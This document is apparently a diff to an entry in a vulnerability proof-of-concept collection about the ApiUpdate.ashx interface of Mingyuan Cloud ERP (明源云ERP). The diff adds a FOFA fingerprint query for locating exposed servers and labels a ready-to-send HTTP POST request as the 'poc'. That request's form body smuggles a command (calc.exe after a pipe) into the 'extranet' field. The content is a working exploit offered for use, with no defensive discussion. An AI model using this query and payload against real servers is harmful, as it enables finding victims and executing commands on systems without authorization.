@@ -1,5 +1,14 @@
 ## 明源云ERP接口ApiUpdate.ashx文件上传漏洞
+
+## fofa
+
+```javascript
+body="hibot.js" || title="明源云ERP"
 ```
+
+## poc
+
+```javascript
 POST /myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a HTTP/1.1
 Host: target.com
 Accept-Encoding: gzip
@@ -10,3 +19,4 @@ Content-Length: 856
 vsoft=kvm&hostType=physical&name=penson&extranet=127.0.0.1%7Ccalc.exe&cpuCores=2&
 memory=16&diskSize=16&desc=&uid=640be59da4851&type=za
 ```
+
